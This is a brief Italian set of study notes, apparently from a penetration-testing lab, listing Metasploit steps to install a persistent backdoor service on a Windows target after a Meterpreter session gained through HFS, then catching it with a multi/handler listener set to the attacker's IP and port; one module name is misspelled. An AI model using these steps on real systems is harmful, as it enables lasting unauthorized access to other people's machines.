Ottenuta una Sessione Meterpreter tramite **hfs** utilizziamo un modulo per la persistenza

1. `use exploit/windows/local/percistance_service` crea una backdoor persistente sul target. Impostare il payload con la giusta architettura
    1. set SESSION
2. **`use exploit/multi/handler`** creato il payload e caricato sul target ci mettiamo in ascolto con la persistenza
3. **`set payload PAYLOAD_UTILZZATO_IN METERPRETER`** mettiamo lo stesso payload 
    1. **LHOST** inserire l’ip in ascolto (mio IP)
    2. **LPORT** inserire posta in ascolto
    3. run
